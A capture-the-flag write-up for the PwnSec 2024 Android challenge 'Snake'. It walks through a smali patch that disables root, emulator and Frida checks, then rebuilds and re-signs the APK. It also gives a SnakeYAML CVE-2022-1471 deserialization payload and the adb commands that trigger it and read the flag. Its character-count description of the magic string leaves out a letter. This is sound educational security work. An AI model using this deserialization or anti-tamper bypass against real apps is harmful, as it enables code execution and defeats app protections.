# LAB 19 Snake – Android Reversing & Deserialization Deep Dive (PwnSec CTF 2024 Mobile Hard)

> EL YAMANI OMAYMA

---

##  Challenge Overview

**Snake** is a hardened Android application designed to resist static and dynamic analysis.  
It combines:

- ❌ Root detection  
- ❌ Emulator detection  
- ❌ Frida detection (native layer)  

Under the hood, it parses an external YAML file using **SnakeYAML 1.33** — a version vulnerable to **CVE-2022-1471**.  
The goal is to weaponize this unsafe deserialization to force the app into instantiating a hidden class called `BigBoss`, which ultimately leaks the flag via JNI to `logcat`.

> **Difficulty**: Hard  
> **Attack Vector**: Deserialization → Remote Code Execution (restricted)  
> **Bypasses**: Static patching (Smali) + YAML payload

---

##  Step 1 — Static Reconnaissance with Jadx

###  The Gateway: `MainActivity.C()`

Inside `MainActivity`, the method `C()` acts as a hidden backdoor — but only if an **Intent extra** named `SNAKE` equals `BigBoss`.

Once triggered, the app looks for an external file:
/sdcard/Snake/skull_face.yml

If found, it passes the content to SnakeYAML for parsing.

<img width="1600" height="693" alt="image" src="https://github.com/user-attachments/assets/4d4d776f-fb51-4db5-90dd-bfea66472881" />



###  The Payload Target: `BigBoss`

The `BigBoss` class is never called legitimately.  
It loads a native library and contains a constructor that expects a very specific string:

```java
str.equals("Snaaaaaaaaaaaaaake")
```
If the string matches, it invokes a native method whose result is logged as the flag.
<img width="980" height="470" alt="Screenshot 2026-05-16 145413" src="https://github.com/user-attachments/assets/43dc8b41-2936-4457-a868-b673a6e93b41" />



 This is the perfect deserialization gadget — a public constructor with controlled input.

 ---
 ## Step 2 — Disabling Root Detection (Smali Patching)
Because the app immediately crashes on rooted/emulated environments, static patching is unavoidable.

### Decompilation
We decompile the APK using apktool:

```bash
java -jar apktool.jar d snake.apk -o snake_smali
```
<img width="903" height="283" alt="image" src="https://github.com/user-attachments/assets/776b72d6-25f9-4602-b0d0-6ea327c7c731" />


 The Patch
The method isDeviceRooted() is responsible for environment checks.
Instead of removing logic, we force it to always return false:
```TEXT

smali
.method public static isDeviceRooted(Landroid/content/Context;)Z
    .locals 1
    const/4 v0, 0x0
    return v0
.end method
```
This single modification neuters all root/emulator/Frida checks in one shot.

✅ No need to patch every check individually.
---

## Step 3 — Rebuilding & Signing
After patching, the APK is rebuilt and signed using uber-apk-signer (debug keystore is sufficient).

```bash
java -jar uber-apk-signer.jar --apks snake_patched.apk
```
<img width="1600" height="674" alt="image" src="https://github.com/user-attachments/assets/f35095a7-500a-4ccd-adbc-3e04ab447758" />

---
## Step 4 — Payload Delivery & Execution
### Preparing the YAML file
We create the required directory and push a malicious YAML file:

```bash
adb shell mkdir -p /sdcard/Snake
adb push Skull_Face.yml /sdcard/Snake/
```
The payload is deliberately crafted to exploit CVE‑2022‑1471:

```yaml
!!com.pwnsec.snake.BigBoss ["Snaaaaaaaaaaaaaake"]
```
### The string length and value must exactly match the one hardcoded in BigBoss:
"Snaaaaaaaaaaaaaake" (16 characters: S + 14×a + ke)

### Triggering the Deserialization
We launch the app with the required Intent extra:

```bash
adb shell am start -n com.pwnsec.snake/.MainActivity -e SNAKE BigBoss
```
<img width="952" height="124" alt="image" src="https://github.com/user-attachments/assets/9ec84dd1-0cf7-4695-9b71-41538842b98d" />

---
## Step 5 — Flag Extraction
Once deserialization occurs, BigBoss is instantiated, the native method is called, and the flag is printed to logcat.

```bash
adb logcat -d -s snake:I
```
<img width="583" height="34" alt="image" src="https://github.com/user-attachments/assets/8a0394bc-18ba-49db-8382-6cd116df777e" />

---
 Final Flag
```text
PWNSEC{W3_r3_Not_To015_of_The_g0v3rnm3n7_OR_4nyOn3_31s3}
```
📚 Key Takeaways
Concept	Implementation
Anti-reverse	Multiple root/emulator/Frida checks
Vulnerability	CVE‑2022‑1471 (SnakeYAML unsafe deserialization)
Gadget class	BigBoss (unused constructor)
Trigger condition	Intent extra SNAKE=BigBoss
Bypass technique	Static Smali patching
Payload format	YAML global tag !!com.pwnsec.snake.BigBoss ["Snaaaaaaaaaaaaaake"]
